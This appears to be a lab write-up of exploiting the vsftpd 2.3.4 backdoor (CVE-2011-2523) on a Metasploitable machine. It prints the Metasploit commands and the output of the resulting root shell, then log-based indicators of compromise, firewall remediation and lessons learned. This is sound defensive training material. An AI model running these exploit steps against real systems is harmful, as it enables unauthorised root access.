üí• Phase 2 ‚Äî Exploitation

Vulnerability: CVE-2011-2523

vsftpd 2.3.4 contains a deliberately planted backdoor. When a username containing :) (smiley face) is submitted, the daemon forks a process that binds /bin/sh to TCP port 6200 with root privileges. No password is required.

Metasploit Commands

msf > use exploit/unix/ftp/vsftpd_234_backdoor
[*] No payload configured, defaulting to cmd/unix/interact

msf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.63.233.95
RHOSTS => 10.63.233.95

msf exploit(unix/ftp/vsftpd_234_backdoor) > exploit
[*] 10.63.233.95:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.63.233.95:21 - USER: 331 Please specify the password.
[*] 10.63.233.95:21 - Backdoor service has been spawned, handling...
[*] 10.63.233.95:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (10.63.233.26:39963 ‚Üí 10.63.233.95:6200)
‚úÖ Root shell obtained in under 3 minutes from initial scan. Session connected from attacker port 39963 ‚Üí target port 6200. uid=0 confirmed immediately.

IoC 1 ‚Äî Metasploit Anonymous Password

The password IEUser@ is Metasploit's hardcoded default anonymous FTP credential. It appears in 12 OK LOGIN entries across multiple time windows. Legitimate anonymous FTP clients send an email address, not IEUser@.

IoC 2 ‚Äî Connection Burst Pattern

6‚Äì11 simultaneous connections within a single second is not normal FTP client behaviour. Metasploit spawns multiple connection threads during exploit attempts.

IoC 3 ‚Äî Nmap SSH Fingerprints

The strings SSH-1.5-Nmap-SSH1-Hostkey and SSH-1.5-NmapNSE_1.0 are unique identifiers inserted by Nmap during SSH version detection. These definitively confirm an Nmap -A scan from 10.63.233.26 at 05:38:47.

IoC 4 ‚Äî r-Services Scan (Nmap probing ports 512‚Äì514)

Nine entries of Connection from 10.63.233.26 on illegal port across rshd and rlogind confirm Nmap was scanning the r-services ports (rexec 512, rlogin 513, rsh 514). These services reject connections from non-privileged ports, producing these log entries.

üõ°Ô∏è Remediation ‚Äî Containment & Hardening

Step 1 ‚Äî Kill vsftpd Process

root@metasploitable:~# ps aux | grep vsftpd
root  5412  0.0  0.0  3004  752 tty1  R+  06:55  0:00 grep vsftpd
root@metasploitable:~# kill -9 4502

Step 2 ‚Äî Kill xinetd (Prevents Respawn)

On Metasploitable, vsftpd runs under xinetd. Killing vsftpd alone is insufficient ‚Äî xinetd will immediately respawn it.

root@metasploitable:~# killall xinetd
root@metasploitable:~# netstat -antp | grep 21
tcp  0  0 0.0.0.0:54221  0.0.0.0:*  LISTEN   (nlockmgr, not vsftpd)

Step 3 ‚Äî Verify Port 21 Closed (Nmap Rescan)

$ nmap 10.63.233.95 -p 21
PORT    STATE   SERVICE
21/tcp  closed  ftp

Step 4 ‚Äî Apply iptables Firewall Rule

closed still responds to TCP RST probes ‚Äî a running service could reopen it. A DROP rule makes the port truly unreachable.

root@metasploitable:~# iptables -A INPUT -p tcp --dport 21 -j DROP

root@metasploitable:~# iptables -L
Chain INPUT (policy ACCEPT)
target     prot opt source     destination
DROP       tcp  --  anywhere   anywhere     tcp dpt:ftp

Step 5 ‚Äî Verify Port 21 Now Filtered

$ nmap 10.63.233.95 -p 21
PORT    STATE    SERVICE
21/tcp  filtered ftp
‚úÖ Port state progression: open ‚Üí closed (vsftpd killed) ‚Üí filtered (iptables DROP). The firewall silently drops all packets to port 21.

‚úÖ Verification ‚Äî Exploit Confirmed Blocked

The full Metasploit exploit was re-run after remediation to confirm the attack path is closed:

msf exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[-] 10.63.233.95:21 - Exploit failed [unreachable]: Rex::ConnectionTimeout
    The connection with (10.63.233.95:21) timed out.
[-] Exploit completed, but no session was created.
‚úÖ Remediation fully verified. The attacker receives a connection timeout. No session is created. The backdoor is inaccessible.

Lessons Learned

FindingLesson
Root shell in <3 minsKnown backdoors in default installations are the fastest possible attack path ‚Äî patch management is critical

Killing vsftpd alone failedxinetd as a service supervisor means the parent process must also be stopped; understand service management before remediating

Data: /etc/shadow, MySQL/PostgreSQL databases, all application files fully exposed.

Regulatory: Potential GDPR/PCI-DSS breach notification obligations.

Cost: Estimated $50,000‚Äì$200,000+ for IR, forensics, rebuild, and legal/regulatory response for a mid-sized organisation.
